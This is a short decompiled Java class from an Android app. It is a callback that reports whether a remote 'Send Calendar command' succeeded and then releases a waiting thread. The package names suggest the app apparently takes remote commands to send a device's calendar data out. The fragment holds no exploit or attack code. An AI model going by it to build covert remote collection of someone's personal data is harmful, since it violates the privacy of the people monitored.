package com.vvt.appengine.a;

import android.os.ConditionVariable;
import com.vvt.datadeliverymanager.a.a;
import com.vvt.datadeliverymanager.i;
import com.vvt.remotecontrol.output.RmtCtrlOutputStatusMessage;

class y
  implements a
{
  y(x paramx) {}
  
  public void a(i parami) {}
  
  public void b(i parami)
  {
    boolean bool1 = parami.f();
    RmtCtrlOutputStatusMessage localRmtCtrlOutputStatusMessage;
    boolean bool2;
    String str;
    if (bool1)
    {
      localRmtCtrlOutputStatusMessage = x.a(this.a);
      bool2 = true;
      localRmtCtrlOutputStatusMessage.setSuccess(bool2);
      localRmtCtrlOutputStatusMessage = x.a(this.a);
      str = "Send Calendar command is complete.";
      localRmtCtrlOutputStatusMessage.setMessage(str);
    }
    for (;;)
    {
      x.b(this.a).open();
      return;
      localRmtCtrlOutputStatusMessage = x.a(this.a);
      bool2 = false;
      localRmtCtrlOutputStatusMessage.setSuccess(false);
      localRmtCtrlOutputStatusMessage = x.a(this.a);
      str = parami.e();
      localRmtCtrlOutputStatusMessage.setMessage(str);
    }
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/appengine/a/y.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */